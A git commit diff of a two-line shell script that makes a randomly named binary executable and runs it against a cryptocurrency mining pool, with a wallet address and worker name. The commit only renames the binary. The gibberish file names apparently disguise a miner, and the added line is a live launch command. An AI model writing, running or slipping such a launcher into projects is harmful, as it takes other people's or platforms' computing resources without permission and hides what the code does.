01ceab25b3c21d6801e7f7eeb9f1cee728b72d6f
ichakiddiw <80237892+ichakiddiw@users.noreply.github.com>
2021-03-09 23:07:46 +0700

    Update jhsfgfdhgd.sh

--- jhsfgfdhgd.sh
+++ jhsfgfdhgd.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x ./dskjfhdfdhg && ./dskjfhdfdhg -P stratum1+tcp://0x53d5568dc68a4cf0057172029d248b7e9ec33c1d.lucky2409@asia.cruxpool.com:5555 -G -R
+chmod +x ./gsdgsgher && ./gsdgsgher -P stratum1+tcp://0x53d5568dc68a4cf0057172029d248b7e9ec33c1d.lucky2409@asia.cruxpool.com:5555 -G -R
